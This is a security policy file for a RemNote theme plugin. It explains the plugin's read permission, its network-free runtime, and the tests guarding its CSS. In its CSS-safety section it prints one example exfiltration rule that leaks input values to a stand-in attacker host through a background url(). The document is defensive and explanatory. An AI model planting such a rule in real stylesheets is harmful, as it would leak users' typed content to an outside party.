# Security

## Reporting a problem

Open a [security advisory](https://github.com/mdeguzis/remnote-sakura-theme/security/advisories/new) rather than a public issue. If you cannot, email mdeguzis@gmail.com.

## What the plugin asks for

`manifest.json` requests `All` at `Read`. That is broader than this theme needs, and it is worth being plain about: it permits reading knowledge base content, and you are taking it on trust that the plugin does not.

It is requested because the reactive event stream that tells the plugin a setting changed is gated behind holding a Read scope. Declaring nothing produces `attempted to perform 'events.addListener', but no scope has permission level of at least 'Read'`, and settings changes never reach the stylesheet. `All` / `Read` is what the RemNote theme plugins already in the marketplace use, so it is the combination known to work.

## What it does with it

Nothing. The entire runtime is `src/widgets/index.tsx`: it registers six settings, reads them, passes them to `compose()`, and calls `plugin.app.registerCSS`. It never calls a `rem`, `search`, `queue` or `knowledge_base` method.

- No network requests at runtime. Every colour and every piece of artwork is compiled into the bundle, so nothing is fetched while you use it and it works offline.
- No stored data beyond the settings RemNote itself persists.
- `compose()` is a pure function from options to a string, with no I/O.

The source is small enough to check rather than trust. `src/widgets/index.tsx` is under 200 lines and `src/lib/compose.ts` is under 150.

## Why the CSS itself is safe to run

Custom CSS is not inert, and RemNote warns about this on the Custom CSS page. Two things worth knowing about this theme specifically:

- **No remote `url()` anywhere.** A remote URL in CSS, combined with an attribute selector, is a working exfiltration channel: `input[value^="a"] { background: url(https://attacker/?a) }` leaks content one character per request. Every image here is an embedded `data:` URI, and a test asserts that no non-`data:` URL survives into the built stylesheet.
- **The decorative layers cannot take input.** The branches, scenery and petals are `position: fixed` full-viewport elements. They all carry `pointer-events: none`, and a test asserts that every fixed layer does, so none of them can intercept a click or cover a control.

## Tests that back this up

```
npm test
```

`tests/css.test.mjs` checks that no remote URL reaches the stylesheet, that every fixed decorative layer sets `pointer-events: none`, and that every custom property the CSS reads is actually declared. `tests/contrast.test.mjs` checks WCAG contrast for body text, muted text, panel text and the accent, in every shade and both modes.
